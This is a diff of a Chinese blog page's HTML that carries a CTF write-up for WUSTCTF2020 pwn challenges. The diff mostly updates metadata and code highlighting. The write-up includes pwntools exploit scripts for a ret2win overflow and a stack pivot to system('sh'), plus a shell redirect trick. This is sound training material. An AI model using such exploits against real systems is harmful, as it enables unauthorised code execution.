@@ -28,7 +28,7 @@
 <meta property="og:description" content="今日在buu水水分，遇到了题目👴就顺便复现一下WUSTCTF">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2020-04-12T15:17:31.000Z">
-<meta property="article:modified_time" content="2020-04-12T15:51:02.923Z">
+<meta property="article:modified_time" content="2020-04-15T11:49:16.305Z">
 <meta property="article:author" content="1p0ch">
 <meta property="article:tag" content="复现">
 <meta property="article:tag" content="WUSTCTF2020">
@@ -209,10 +209,16 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2020-04-12 23:17:31 / 修改时间：23:51:02" itemprop="dateCreated datePublished" datetime="2020-04-12T23:17:31+08:00">2020-04-12</time>
+              <time title="创建时间：2020-04-12 23:17:31" itemprop="dateCreated datePublished" datetime="2020-04-12T23:17:31+08:00">2020-04-12</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-04-15 19:49:16" itemprop="dateModified" datetime="2020-04-15T19:49:16+08:00">2020-04-15</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="fa fa-folder-o"></i>
@@ -236,7 +242,7 @@
                 <i class="fa fa-file-word-o"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>1.2k</span>
+              <span>1k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
@@ -258,11 +264,11 @@
         <p>今日在buu水水分，遇到了题目👴就顺便复现一下WUSTCTF</p>
 <a id="more"></a> 
 <h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>简单的ret2win<br>exp：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">context.arch &#x3D; &#39;i386&#39;</span><br><span class="line">#p&#x3D;process(&#39;.&#x2F;wustctf2020_getshell&#39;)</span><br><span class="line">p&#x3D;remote(&#39;node3.buuoj.cn&#39;,25756)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;wustctf2020_getshell&#39;)</span><br><span class="line">backdoor&#x3D;0x804851b</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">payload&#x3D;&#39;a&#39;*0x1c+p32(backdoor)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line"><span class="comment">#p=process('./wustctf2020_getshell')</span></span><br><span class="line">p=remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">25756</span>)</span><br><span class="line">elf=ELF(<span class="string">'./wustctf2020_getshell'</span>)</span><br><span class="line">backdoor=<span class="number">0x804851b</span></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x1c</span>+p32(backdoor)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 <h3 id="closed"><a href="#closed" class="headerlink" title="closed"></a>closed</h3><p>直接提供shell，但是标准错误，标准输出流全关，需要将输出重定向到标准输入流<br>nc上之后直接</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat flag &gt;&amp;0</span><br></pre></td></tr></table></figure>
 <h3 id="getshell-2"><a href="#getshell-2" class="headerlink" title="getshell_2"></a>getshell_2</h3><p>栈迁移：使用已有的read函数加上bss地址，由于没有其他字符串，可以用system(‘sh’)来getshell<br>exp：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">context.arch &#x3D; &#39;i386&#39;</span><br><span class="line">p&#x3D;process(&#39;.&#x2F;wustctf2020_getshell_2&#39;)</span><br><span class="line">#p&#x3D;remote(&#39;node3.buuoj.cn&#39;,25756)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;wustctf2020_getshell_2&#39;)</span><br><span class="line">backdoor&#x3D;0x804851b</span><br><span class="line"></span><br><span class="line">sh_addr&#x3D;0x8048670</span><br><span class="line">read_addr&#x3D;0x804858B</span><br><span class="line">read_addr_2&#x3D;0x804858D</span><br><span class="line">system_addr&#x3D;0x80483E0</span><br><span class="line">bss&#x3D;0x804a040+0x300</span><br><span class="line">leave_ret&#x3D;0x08048488</span><br><span class="line">p.recv()</span><br><span class="line">payload&#x3D;&#39;a&#39;*0x18+p32(bss+0x18)+p32(read_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">payload&#x3D;&#39;aaaa&#39;+p32(system_addr)+p32(0)+p32(sh_addr)+p32(0)*2+p32(bss)+p32(leave_ret)</span><br><span class="line">#here to fill 0x18 size 这里bss前要填充0x18个字符</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line">p=process(<span class="string">'./wustctf2020_getshell_2'</span>)</span><br><span class="line"><span class="comment">#p=remote('node3.buuoj.cn',25756)</span></span><br><span class="line">elf=ELF(<span class="string">'./wustctf2020_getshell_2'</span>)</span><br><span class="line">backdoor=<span class="number">0x804851b</span></span><br><span class="line"></span><br><span class="line">sh_addr=<span class="number">0x8048670</span></span><br><span class="line">read_addr=<span class="number">0x804858B</span></span><br><span class="line">read_addr_2=<span class="number">0x804858D</span></span><br><span class="line">system_addr=<span class="number">0x80483E0</span></span><br><span class="line">bss=<span class="number">0x804a040</span>+<span class="number">0x300</span></span><br><span class="line">leave_ret=<span class="number">0x08048488</span></span><br><span class="line">p.recv()</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x18</span>+p32(bss+<span class="number">0x18</span>)+p32(read_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">payload=<span class="string">'aaaa'</span>+p32(system_addr)+p32(<span class="number">0</span>)+p32(sh_addr)+p32(<span class="number">0</span>)*<span class="number">2</span>+p32(bss)+p32(leave_ret)</span><br><span class="line"><span class="comment">#here to fill 0x18 size 这里bss前要填充0x18个字符</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
     </div>
 
     
@@ -441,13 +447,13 @@
       <i class="fa fa-area-chart"></i>
     </span>
       <span class="post-meta-item-text">站点总字数：</span>
-    <span title="站点总字数">50k</span>
+    <span title="站点总字数">42k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">45 分钟</span>
+    <span title="站点阅读时长">39 分钟</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
